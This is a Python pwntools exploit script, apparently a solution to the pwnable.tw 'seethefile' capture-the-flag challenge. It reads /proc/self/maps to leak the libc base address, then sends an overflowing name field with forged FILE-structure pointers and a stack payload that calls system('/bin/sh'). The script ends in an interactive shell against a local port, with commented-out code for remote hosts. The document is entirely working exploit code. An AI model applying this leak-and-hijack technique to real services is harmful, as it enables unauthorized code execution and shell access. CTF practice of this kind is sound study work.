#!/usr/bin/env python

from pwn import *
import sys

def myopen(name):
	r.sendline('1')
	r.recvuntil(':')
	r.sendline(name)
	r.recvuntil(':')

def myread():
	r.sendline('2')
	r.recvuntil(':')

def mywrite():
	r.sendline('3')
	leak = r.recvuntil('------').strip('------')
	r.recvuntil(':')
	return leak

def myclose():
	r.sendline('4')
	r.recvuntil(':')

def myexit(name, stack = "\x00"):
	r.sendline('5' + stack)
	r.recvuntil(':')
	r.sendline(name)

def exploit(r):
	r.recvuntil(' :')
	
	myopen('/proc/self/maps')
	myread()
	myread()

	leak = mywrite().split('\n')
	#libc_base = int(leak[1][:8], 16)
	libc_base = int(leak[1][:8], 16)+0x4000
	libc_ret = libc_base + 0x00075a61			# : add esp, 0x100 ; ret
	libc_system = libc_base + 0x3a940
	libc_binsh = libc_base + 0x158e8b
	log.info("Libc base: " + hex(libc_base))

	name  = p32(libc_ret) * 8
	name += p32(0x804b280)
	#name += p32(0xdead)
	name += p32(0) * 16
	#name += p32(0x41414141) * 2
	name += p32(0) * 20
	name += p32(0x804b238)
	#name += p32(0x41414141) * 14

	stack  = '\x00CC'
	stack += 'C' * (76+0x30)
	stack += p32(libc_system)
	stack += p32(libc_binsh) * 2

	raw_input('@')
	myexit(name, stack)

	r.interactive()


if __name__ == "__main__":
	r = remote('127.0.0.1', 7122)
	exploit(r)
	'''
	log.info("For remote: %s HOST PORT" % sys.argv[0])
	if len(sys.argv) > 1:
		r = remote(sys.argv[1], int(sys.argv[2]))
		exploit(r)
	else:
		r = process(['/vagrant/pwnable.tw/seethefile/seethefile'])
		print util.proc.pidof(r)
		pause()
		exploit(r)
	'''
